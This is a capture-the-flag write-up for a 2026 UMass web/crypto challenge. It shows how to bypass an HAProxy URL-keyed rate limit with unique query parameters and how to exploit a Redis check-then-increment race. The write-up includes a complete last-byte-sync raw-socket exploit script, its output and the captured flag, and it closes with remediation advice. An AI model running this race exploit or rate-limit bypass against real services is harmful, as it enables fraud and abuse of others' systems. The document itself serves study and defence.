# Hens and Roosters - UMASS CTF 2026 write up

**Description:** 
"Please help me buy more Legos! The store has such aggressive rate limiting I can't even get an ID!"
`http://hensandroosters.crypto.ctf.umasscybersec.org/`

---

## 1. TL;DR

Despite being categorized as a Cryptography challenge featuring the complex Unbalanced Oil and Vinegar (UOV) signature scheme, the actual vulnerability lies entirely within the web infrastructure and state management. 

By abusing an HAProxy rate-limit misconfiguration (parameter injection) and a Time-of-Check to Time-of-Use (TOCTOU) race condition in the Flask/Redis caching logic, we bypassed the cryptographic verification completely. Using a "Last-Byte Sync" raw TCP socket attack, we forced 60 concurrent increments to our account balance, instantly bypassing the server's maximum threshold and granting us enough funds to buy the flag.

---

## 2. Infrastructure and Data Analysis

The challenge provided a downloadable archive containing the backend, proxy, and configuration files.

### File Structure Overview
*   `compose.yaml` - Defines a 3-container stack: HAProxy, Flask (Gunicorn backend), and Redis.
*   `proxy/haproxy.cfg` - The HAProxy configuration responsible for the "aggressive rate limiting" mentioned in the description.
*   `backend/app.py` - The main web application written in Flask.
*   `backend/uov.py` - A SageMath implementation of the Unbalanced Oil and Vinegar signature scheme.
*   `backend/*.sobj` - The public and private keys.

### The Cryptographic Decoy
The challenge actively baits players into reverse-engineering `uov.py`. UOV is a post-quantum multivariate cryptography scheme. Attempting to mathematically forge a signature or find an algebraic flaw here is a massive rabbit hole designed to waste time. A key skill in CTFs is evaluating the entire attack surface; in this case, the web application logic is significantly weaker than the math.

### The Application Flow
The goal is to accumulate **7 "studs"** (points) to buy the Lego set (the flag) at the `/buy` endpoint.
1.  **`/` (Index):** Generates a random `uid` and initializes your studs to `0` in Redis.
2.  **`/buy`:** If you have 0 studs, it gives you a free UOV signature for the string `0|<uid>`. If you have 7+ studs, it returns the flag.
3.  **`/work`:** Takes your `uid` and a `sig`. It verifies the signature. If valid, it increments your studs and returns a new signature for `<new_stud_count>|<uid>`. 

**The Restriction:** If your studs reach `3`, the server hard-stops returning new signatures, stating: `"You're not getting any more free studs!"`. Because UOV is cryptographically secure, you cannot forge a signature for `3|<uid>` to keep climbing to 7.

---

## 3. Problem Analysis in Detail

We are mathematically locked out of reaching 7 studs. However, auditing the application stack reveals two critical implementation flaws.

### Flaw 1: HAProxy Rate Limit Bypass
The challenge description hints at "aggressive rate limiting." Looking at `haproxy.cfg`:
```haproxy
stick-table type string len 2048 size 100k expire 20s store http_req_rate(20s)
http-request track-sc0 url
http-request deny deny_status 429 if { sc_http_req_rate(0) gt 1 }
```
HAProxy tracks the rate limit based on the exact `url`. In the context of HTTP and HAProxy, `url` includes the query string (e.g., `/buy?uid=123`). 

Because the tracking key is the literal string of the URL, we can append a random, unique query parameter to every single request (e.g., `/?bypass=1`, `/?bypass=2`). HAProxy will treat every request as an entirely new entity with no prior history in the `stick-table`, effectively disabling the rate limit.

### Flaw 2: Redis TOCTOU Race Condition
Look at the signature verification and increment logic in `app.py`:
```python
# --- TIME OF CHECK ---
studs = r.get(uid)
studs = int(studs)
payload = str(studs) + '|' + uid

value = r.get(str(sig))

if value is None:
    verified = uov.verify(payload, sig_bytes) # Heavy, slow crypto math
else:
    verified = value.decode() == payload      # Fast cache bypass!

# --- TIME OF USE ---
if verified:
    studs = r.incr(uid) # Atomic Redis increment
    if studs > 2:
        return "You're not getting any more free studs!"
    else:
        new_sig = uov.sign(str(studs) + '|' + uid)
        return f"Your next free stud is {new_sig}!"
```

**The Vulnerability:** There is no transaction lock (mutex) between reading the current balance (`r.get(uid)`) and updating it (`r.incr(uid)`). 

If we send 10 simultaneous requests using a valid signature for `2|<uid>`, here is what happens at the CPU level across 10 server threads:
1.  **Thread 1 to 10:** Execute `r.get(uid)`. All read `studs = 2`.
2.  **Thread 1 to 10:** Construct `payload = '2|uid'`.
3.  **Thread 1 to 10:** Check the cache. Because `sig_2` is cached, `value.decode() == payload` is true for all 10 threads.
4.  **Thread 1 to 10:** All threads proceed into the `if verified:` block.
5.  **Thread 1 to 10:** All threads execute `r.incr(uid)`. 

While `r.incr()` itself is atomic (meaning the count will correctly go up by 10 without data corruption), the *authorization* to execute that increment was based on a stale read (`studs = 2`). Our studs will rocket to 12, bypassing the `studs > 2` lockout.

---

## 4. Initial Guesses and The Concurrency Problem

Our first exploitation attempt utilized Python's `requests` library combined with standard `threading`. We legally worked our way up to 2 studs to obtain a valid `sig_2`, then launched 45 concurrent threads against `/work`.

**The Result:** The script only managed to increment the balance by 1 or 2, leaving us at 3 or 4 total studs. 

**Why it failed:** 
1. **The Python GIL:** Python's Global Interpreter Lock prevents true parallel execution of threads.
2. **Network Jitter:** Operating system TCP stacks and network routing introduce microsecond delays.

Because the window of vulnerability between `r.get` and `r.incr` is fractions of a millisecond, the requests arrived at the Gunicorn backend slightly staggered. Thread A would finish its increment before Thread B even reached the `r.get` check. We needed exactly 5 perfectly overlapping requests to jump from 2 to 7 studs, which standard HTTP libraries struggle to guarantee.

---

## 5. Exploitation Walkthrough: The Last-Byte Sync

To achieve absolute, perfect concurrency, we must bypass Python's threading limitations and use a technique known as **Last-Byte Sync** (a concept related to Slowloris attacks).

Instead of letting HTTP libraries manage the requests, we manually construct raw TCP sockets:
1. We open 60 concurrent TCP connections directly to the web server.
2. We send the HTTP headers and the JSON payload **minus the very last byte**.
3. The Gunicorn backend allocates a worker thread for each connection. The worker attempts to read the `Content-Length` specified, but because we withheld one byte, all 60 threads block and hang on the `recv()` system call.
4. This perfectly aligns all 60 server threads exactly at the starting line, waiting for our signal.
5. We iterate over all 60 sockets and blast the final byte in a tight loop.
6. All 60 threads unblock at the exact same microsecond. The operating system context-switches them simultaneously, guaranteeing a massive collision at the Time-of-Check logic.

### Exploit Script
```python
import socket
import time
import json
import uuid
import re
import requests

URL = "http://hensandroosters.crypto.ctf.umasscybersec.org"
HOST = "hensandroosters.crypto.ctf.umasscybersec.org"
PORT = 80

def exploit():
    # Bypass HAProxy tracking by injecting a unique run ID
    run_id = uuid.uuid4().hex[:8]
    print(f"[*] Attempt run_id: {run_id}")
    
    # Step 1: Legitimate Sequential Ramp-Up (0 -> 2)
    # Using ?bypass=run_id to evade rate limiting
    r1 = requests.get(f"{URL}/?bypass={run_id}_uid")
    uid = re.search(r"uid is ([a-f0-9]+)!", r1.text).group(1)
    
    r2 = requests.get(f"{URL}/buy?uid={uid}&bypass={run_id}_buy")
    sig_0 = re.search(r"signature: ([a-f0-9]{508})", r2.text).group(1)
    
    r3 = requests.post(f"{URL}/work?bypass={run_id}_w0", json={"uid": uid, "sig": sig_0})
    sig_1 = re.search(r"free stud is ([a-f0-9]{508})!", r3.text).group(1)
    
    r4 = requests.post(f"{URL}/work?bypass={run_id}_w1", json={"uid": uid, "sig": sig_1})
    sig_2 = re.search(r"free stud is ([a-f0-9]{508})!", r4.text).group(1)
        
    print(f"[*] Reached 2 studs. Got sig_2. Initializing Last-Byte Sync Race Engine...")
    
    # Step 2: Establish Socket Connections
    threads_count = 60 
    sockets =[]
    payload = json.dumps({"uid": uid, "sig": sig_2}).encode()
    
    for i in range(threads_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            # Prevent TCP buffering so our final byte sends immediately
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((HOST, PORT))
            
            req = f"POST /work?bypass={run_id}_race_{i} HTTP/1.1\r\n"
            req += f"Host: {HOST}\r\n"
            req += "Content-Type: application/json\r\n"
            req += f"Content-Length: {len(payload)}\r\n"
            req += "Connection: keep-alive\r\n\r\n"
            
            # Send everything EXCEPT the very last byte of the JSON body
            s.sendall(req.encode() + payload[:-1])
            sockets.append(s)
        except Exception as e:
            pass
            
    print(f"[*] Primed {len(sockets)} HTTP connections. Firing final byte sync!")
    
    # Step 3: Trigger the Race (Blast the final byte)
    last_byte = payload[-1:]
    for s in sockets:
        try: 
            s.sendall(last_byte)
        except: 
            pass
            
    # Step 4: Harvest increments
    successes = 0
    for s in sockets:
        try:
            resp = s.recv(4096).decode()
            if "free stud is" in resp or "not getting any more free studs" in resp:
                successes += 1
            s.close()
        except: 
            pass
            
    print(f"[*] Race condition completed. Caught {successes} atomic increments!")
    
    # Step 5: Extract the flag
    time.sleep(1) # Brief pause to let backend Redis writes finish
    r_final = requests.get(f"{URL}/buy?uid={uid}&bypass={run_id}_flag")
    match = re.search(r"UMASS\{.*?\}", r_final.text)
    if match:
        print(f"\n[SUCCESS] FLAG CAPTURED: {match.group(0)}")
        return True
    return False

if __name__ == "__main__":
    exploit()
```

### Execution Output
```text
[*] Attempt run_id: e851621e
[*] Reached 2 studs. Got sig_2. Initializing Last-Byte Sync Race Engine...
[*] Primed 60 HTTP connections. Firing final byte sync!
[*] Race condition completed. Caught 60 atomic increments!

[SUCCESS] FLAG CAPTURED: UMASS{oil_does_mix_with_oil_but_roosters_dont}
```

---

## 6. What We Learned and How to Fix It

1.  **Don't Let Cryptography Blind You:** In security audits and CTFs, complex custom cryptography implementations (`uov.py`) can be intimidating distractions. Always evaluate the surrounding infrastructure. The strongest lock in the world is useless if the hinges on the door are broken.
2.  **Fixing the HAProxy Misconfiguration:** Rate limiting by `url` (`track-sc0 url`) is inherently flawed if the backend application accepts arbitrary query parameters. Tracking should be done by the client's IP address (`track-sc0 src`) or by stripping query parameters and tracking just the base path (`track-sc0 base`).
3.  **Fixing the TOCTOU Logic:** Relying on separate `get` and `set/incr` commands in a distributed cache is fundamentally unsafe for state transitions. To fix this, the developer should use:
    *   **Redis Transactions:** Using `WATCH`, `MULTI`, and `EXEC` to abort the transaction if the `uid` key changes before the increment occurs.
    *   **Lua Scripting:** Redis can execute custom Lua scripts atomically. The logic for "check if balance < 3, then increment" could be bundled into a single Lua script.
    *   **Distributed Locks:** Using a pattern like Redlock to guarantee only one thread modifies a specific user's state at a time.
4.  **True Concurrency Execution:** Standard `requests` + `threading` is rarely enough to exploit tight race windows. The **Last-Byte Sync** technique via raw TCP sockets is a powerful, deterministic method for forcing thread alignment on the backend application server.